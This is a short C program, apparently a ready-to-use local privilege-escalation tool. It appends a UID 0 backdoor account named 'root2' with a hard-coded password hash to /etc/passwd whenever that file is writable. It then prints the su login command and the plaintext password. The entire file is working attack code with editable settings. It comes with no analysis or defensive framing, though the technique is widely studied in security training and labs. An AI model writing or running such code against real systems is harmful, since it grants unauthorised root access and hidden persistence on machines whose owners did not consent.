#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * linux-passwd-writer - /etc/passwd Root Injection
 *
 * Appends a root-level user (UID 0, GID 0) to /etc/passwd.
 * Only works if /etc/passwd is writable by your user.
 *
 * Check: ls -l /etc/passwd
 * Generate hash: openssl passwd <password>
 *
 */

// -- CONFIGURE THESE --------------------------------------
#define NEW_USER   "root2"
#define PASS_HASH  "Fdzt.eqJQ4s0g"   /* openssl passwd w00t */
#define LOGIN_SHELL "/bin/bash"
// ---------------------------------------------------------

int main(void) {
    FILE *fp = fopen("/etc/passwd", "a");
    if (!fp) {
        perror("[-] Cannot open /etc/passwd");
        return 1;
    }

    fprintf(fp, "%s:%s:0:0:root:/root:%s\n", NEW_USER, PASS_HASH, LOGIN_SHELL);
    fclose(fp);

    printf("[+] User '%s' added to /etc/passwd with UID 0.\n", NEW_USER);
    printf("[*] Login: su %s  (password: w00t)\n", NEW_USER);
    return 0;
}
